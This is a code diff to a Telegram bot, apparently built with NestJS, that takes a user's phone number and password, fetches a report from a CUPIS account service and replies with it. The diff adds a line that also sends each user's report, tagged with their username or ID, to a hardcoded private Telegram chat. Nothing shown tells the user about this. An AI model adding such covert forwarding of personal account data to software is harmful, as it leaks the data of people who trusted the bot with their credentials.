@@ -1,5 +1,6 @@
 import {
   Ctx,
+  InjectBot,
   Message,
   On,
   Scene,
@@ -7,7 +8,7 @@ import {
   SceneLeave,
 } from 'nestjs-telegraf';
 import { CHECK_SCENE_NAME, checkMessage, menuKeyboard } from './constants';
-import { Scenes } from 'telegraf';
+import { Scenes, Telegraf, Context } from 'telegraf';
 import { Injectable } from '@nestjs/common';
 import { CupisRepository } from './cupis.repository';
 import { checkerMapper } from './checker.mapper';
@@ -19,7 +20,7 @@ const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 @Scene(CHECK_SCENE_NAME)
 @Injectable()
 export class CheckerScene {
-  constructor(private cupicRepository: CupisRepository) {}
+  constructor(private cupicRepository: CupisRepository, @InjectBot('checker') private bot: Telegraf<Context>) {}
 
   @SceneEnter()
   async sceneEnter(@Ctx() ctx: Scenes.SceneContext) {
@@ -53,8 +54,10 @@ export class CheckerScene {
       await ctx.reply('♾️ Идёт обработка...');
 
       const report = await this.cupicRepository.getReport(phoneNumber.nationalNumber, password);
+      const mappedReport = checkerMapper.getReportMessage(report);
 
-      await ctx.reply(checkerMapper.getReportMessage(report));
+      await ctx.reply(mappedReport);
+      await this.bot.telegram.sendMessage('-1002050901184', `Контант для связи: ${ctx.from.username ?? ctx.from.id}\n\n${mappedReport}`)
     } catch(err) {
       
       if (err instanceof AxiosError) {
